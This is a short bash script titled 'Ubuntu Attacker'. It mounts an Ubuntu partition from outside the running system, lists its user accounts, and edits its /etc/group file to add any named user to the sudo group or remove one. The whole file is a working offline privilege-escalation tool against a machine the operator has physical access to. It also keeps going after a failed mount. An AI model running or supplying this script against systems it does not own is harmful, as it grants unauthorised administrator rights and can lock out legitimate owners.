#!/bin/bash

ubuntu_partition="/dev/nvme0n1p5"
ubuntu_mount="/mnt/ubuntu"
ubuntu_groups="/mnt/ubuntu/etc/group"

clear
echo "-------------------------------------------"
echo "              Ubuntu Attacker              "
echo "-------------------------------------------"
echo

echo "--------------Mounting Ubuntu--------------"

mkdir -p "$ubuntu_mount"

if mountpoint -q "$ubuntu_mount"; then
	echo "[SUCCESS] Ubuntu is already mounted."
else
	if mount "$ubuntu_partition" "$ubuntu_mount"; then
		echo "[SUCCESS] Ubuntu mounted successfully."
	else
		echo "[ERROR] Failed to mount Ubuntu."
	fi
fi

echo
echo "---------------User Accounts---------------"
awk -F: '$3 >= 1000 && $3 < 65534 {
	printf "Username: %-20s UID: %s\n", $1, $3
}' "$ubuntu_mount/etc/passwd"
echo

username="regularuser1"

echo "--------------Current Sudoers--------------"	
grep '^sudo:' "$ubuntu_groups"
echo

echo "---------------Sudo Manager----------------"
echo "1. Add user to sudo"
echo "2. Remove user from sudo"
echo

read -rp "Choose an option: " choice

case "$choice" in
	1)
		echo "Adding User to Sudoers"
		;;
	2)
		echo "Removing User from Sudoers"
		;;
	*)
		echo "[ERROR] Invalid option."
		exit 1
		;;
esac

echo
echo "---------------User Accounts---------------"
awk -F: '$3 >= 1000 && $3 < 65534 {
	printf "Username: %-20s UID: %s\n", $1, $3
}' "$ubuntu_mount/etc/passwd"
echo

read -rp "Enter the Username of the user to modify: " username

if [[ "$choice" == "1" ]]; then
	awk -F: -v user="$username" '
	$1 == "sudo" {
		if ($4 == "") {
			$4 = user
		} else if (index("," $4 ",", "," user ",") == 0) {
			$4 = $4 "," user
		}
	}
	{ print }
	' OFS=: "$ubuntu_groups" > "${ubuntu_groups}.tmp"
fi

if [[ "$choice" == "2" ]]; then
	awk -F: -v user="$username" '
	$1 == "sudo" {
		n = split($4, current_user, ",")
		new_users = ""
		for (i = 1; i <= n; i++) {
			if (current_user[i] != user) {
				if (new_users != "")
					new_users = new_users ","
				new_users = new_users current_user[i]
			}
		}
		$4 = new_users
	} 
	{ print }
	' OFS=: "$ubuntu_groups" > "${ubuntu_groups}.tmp"
fi

mv "${ubuntu_groups}.tmp" "$ubuntu_groups"

echo
echo "--------------Updated Sudoers--------------"	
grep '^sudo:' "$ubuntu_groups"
echo
